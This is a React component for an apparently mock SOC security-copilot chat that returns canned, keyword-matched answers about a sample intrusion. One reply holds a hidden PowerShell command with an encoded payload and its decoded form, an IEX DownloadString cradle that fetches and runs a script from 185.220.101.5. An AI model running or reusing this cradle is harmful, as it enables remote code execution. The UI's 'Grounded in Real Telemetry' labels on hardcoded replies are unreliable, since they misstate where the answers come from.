import React, { useState } from 'react';
import { Bot, Send, Sparkles } from 'lucide-react';
import type { ChatMessage, Incident } from '../types';

interface AssistantViewProps {
  currentIncident: Incident;
}

export const AssistantView: React.FC<AssistantViewProps> = ({ currentIncident }) => {
  const [messages, setMessages] = useState<ChatMessage[]>([
    {
      id: 'm1',
      sender: 'assistant',
      text: `Greetings Analyst Dawit. I am your ETHIO-CYBERGUARD Security Copilot. I have indexed all real-time telemetry, threat intelligence matches, and host logs for incident ${currentIncident.incident_number}. I will answer all queries strictly grounded in corroborated platform evidence. How can I assist your investigation?`,
      timestamp: '11:32:00 EAT',
      citations: [
        { source: 'Core Engine', entity: 'Telemetry Correlated: 6 Events, 1 C2 Match' }
      ]
    }
  ]);
  const [input, setInput] = useState('');
  const [isTyping, setIsTyping] = useState(false);

  const presetQueries = [
    `Why is ${currentIncident.incident_number} critical?`,
    "Explain the obfuscated PowerShell encoded payload",
    "What response actions are pending human approval?",
    "Summarize executive business impact for CISO"
  ];

  const handleSend = (textToSend?: string) => {
    const query = textToSend || input;
    if (!query.trim()) return;

    const userMsg: ChatMessage = {
      id: `u_${Date.now()}`,
      sender: 'analyst',
      text: query,
      timestamp: '11:34:10 EAT'
    };

    setMessages(prev => [...prev, userMsg]);
    setInput('');
    setIsTyping(true);

    // Grounded response generator
    setTimeout(() => {
      let replyText = "";
      let citations: Array<{ source: string; entity: string }> = [];

      const q = query.toLowerCase();
      if (q.includes("why") && (q.includes("critical") || q.includes("score"))) {
        replyText = `${currentIncident.incident_number} is classified as CRITICAL (Risk 92/100) based on three verified evidence items:\n\n1. **Privileged Account**: Interactive logon by user 'administrator' on core asset ${currentIncident.affected_asset}.\n2. **Verified C2 Infrastructure**: Network socket established with IP 185.220.101.5, confirmed Cobalt Strike TeamServer on Ethio-CERT blacklist.\n3. **Living-off-the-Land Evasion**: Base64 encoded in-memory PowerShell execution designed to bypass local AV script auditing.`;
        citations = [
          { source: 'Event 4688', entity: 'powershell.exe -enc ...' },
          { source: 'Ethio-CERT Feed', entity: '185.220.101.5 (Cobalt Strike)' },
          { source: 'Risk Agent', entity: 'Calculated Score: 92/100' }
        ];
      } else if (q.includes("powershell") || q.includes("payload") || q.includes("encoded")) {
        replyText = `The encoded command on ${currentIncident.affected_asset} was: \n\`\`\`powershell\npowershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AYgBlAGEAYwBvAG4ALgBwAHMxIikA\n\`\`\`\n**Decoded Forensic String**:\n\`IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/beacon.ps1')\`\nThis dynamically retrieves and compiles the Cobalt Strike Beacon DLL directly inside memory without touching disk storage.`;
        citations = [
          { source: 'ScriptBlock 4104', entity: 'PID 4812 In-Memory Stager' }
        ];
      } else if (q.includes("response") || q.includes("action") || q.includes("approval")) {
        replyText = `There are **2 pending actions** requiring your explicit authorization:\n\n1. **ISOLATE_HOST**: Cut network traffic for ${currentIncident.affected_asset} (Confidence 94%).\n2. **BLOCK_IP**: Egress/ingress drop for 185.220.101.5 across perimeter gateway routers (Confidence 98%).\n\n*Notice: As a human-in-the-loop platform, the system will not isolate hardware without your confirmation in the Response Center.*`;
        citations = [
          { source: 'Response Queue', entity: 'ACT-001 & ACT-002 Pending' }
        ];
      } else {
        replyText = `Grounded analysis for ${currentIncident.incident_number}: All 7 AI agents have evaluated the telemetry. We have confirmed the intrusion path from interactive login to external C2 rendezvous. You can inspect the visual Attack Relationship Graph or authorize host isolation.`;
        citations = [
          { source: 'Incident Graph', entity: 'Topology Mapped' }
        ];
      }

      const botMsg: ChatMessage = {
        id: `b_${Date.now()}`,
        sender: 'assistant',
        text: replyText,
        timestamp: '11:34:12 EAT',
        citations
      };

      setMessages(prev => [...prev, botMsg]);
      setIsTyping(false);
    }, 600);
  };

  return (
    <div className="bg-[#111923] border border-[#1E2A38] rounded-xl flex flex-col h-[calc(100vh-8.5rem)]">
      {/* Copilot Header */}
      <div className="p-4 border-b border-[#1E2A38] flex items-center justify-between bg-[#0D131C] rounded-t-xl">
        <div className="flex items-center space-x-3">
          <div className="p-2 rounded-lg bg-[#00D9FF]/10 text-[#00D9FF] border border-[#00D9FF]/30">
            <Bot className="w-5 h-5" />
          </div>
          <div>
            <div className="flex items-center space-x-2">
              <h2 className="text-sm font-bold text-white">ETHIO-CYBERGUARD Security Assistant</h2>
              <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-[#22C55E]/15 text-[#22C55E] border border-[#22C55E]/30">
                Grounded in Real Telemetry
              </span>
            </div>
            <p className="text-xs text-[#7D8A99]">Context: Incident {currentIncident.incident_number} ({currentIncident.affected_asset})</p>
          </div>
        </div>

        <div className="text-xs text-[#7D8A99] hidden sm:block font-mono">
          Strict Anti-Hallucination Policy: ACTIVE
        </div>
      </div>

      {/* Preset Query Chips */}
      <div className="p-3 bg-[#070B12] border-b border-[#1E2A38] flex items-center space-x-2 overflow-x-auto text-xs">
        <Sparkles className="w-3.5 h-3.5 text-[#00D9FF] shrink-0" />
        <span className="text-[#7D8A99] shrink-0">Suggested:</span>
        {presetQueries.map((chip, idx) => (
          <button
            key={idx}
            onClick={() => handleSend(chip)}
            className="px-2.5 py-1 rounded-full bg-[#111923] hover:bg-[#1E2A38] text-[#E6EDF3] border border-[#1E2A38] hover:border-[#00D9FF]/40 text-[11px] whitespace-nowrap transition"
          >
            {chip}
          </button>
        ))}
      </div>

      {/* Chat Messages Log */}
      <div className="flex-1 p-5 overflow-y-auto space-y-4">
        {messages.map((m) => (
          <div
            key={m.id}
            className={`flex flex-col ${m.sender === 'analyst' ? 'items-end' : 'items-start'}`}
          >
            <div className={`max-w-2xl rounded-xl p-4 text-xs leading-relaxed ${
              m.sender === 'analyst' 
                ? 'bg-[#00D9FF]/10 text-white border border-[#00D9FF]/30' 
                : 'bg-[#0D131C] text-[#E6EDF3] border border-[#1E2A38]'
            }`}>
              <div className="flex items-center space-x-2 mb-1.5">
                {m.sender === 'analyst' ? (
                  <>
                    <span className="font-bold text-[#00D9FF]">Dawit Mengistu (Analyst)</span>
                    <span className="text-[10px] text-[#7D8A99]">{m.timestamp}</span>
                  </>
                ) : (
                  <>
                    <Bot className="w-3.5 h-3.5 text-[#00D9FF]" />
                    <span className="font-bold text-white">Security Assistant</span>
                    <span className="text-[10px] text-[#7D8A99]">{m.timestamp}</span>
                  </>
                )}
              </div>

              <div className="whitespace-pre-wrap">{m.text}</div>

              {/* Verified Evidence Citations */}
              {m.citations && m.citations.length > 0 && (
                <div className="mt-3 pt-2.5 border-t border-[#1E2A38] flex flex-wrap gap-1.5">
                  <span className="text-[10px] text-[#7D8A99] uppercase font-mono mr-1">Citations:</span>
                  {m.citations.map((c, cIdx) => (
                    <span key={cIdx} className="text-[10px] font-mono px-2 py-0.5 rounded bg-[#111923] text-[#00D9FF] border border-[#00D9FF]/20">
                      [{c.source}]: {c.entity}
                    </span>
                  ))}
                </div>
              )}
            </div>
          </div>
        ))}

        {isTyping && (
          <div className="flex items-center space-x-2 text-xs text-[#00D9FF] p-2 bg-[#0D131C] rounded-lg w-48 border border-[#1E2A38]">
            <Bot className="w-4 h-4 animate-spin" />
            <span>Consulting Evidence Locker...</span>
          </div>
        )}
      </div>

      {/* Input Box */}
      <div className="p-3 bg-[#0D131C] border-t border-[#1E2A38] rounded-b-xl flex items-center space-x-2">
        <input 
          type="text" 
          placeholder={`Ask about ${currentIncident.incident_number}, evidence artifacts, or threat actors...`}
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={(e) => e.key === 'Enter' && handleSend()}
          className="flex-1 bg-[#070B12] border border-[#1E2A38] rounded-lg py-2 px-3 text-xs text-white placeholder-[#7D8A99] focus:outline-none focus:border-[#00D9FF]"
        />
        <button 
          onClick={() => handleSend()}
          className="p-2 bg-[#00D9FF] hover:bg-[#00D9FF]/80 text-black font-bold rounded-lg transition"
        >
          <Send className="w-4 h-4" />
        </button>
      </div>
    </div>
  );
};
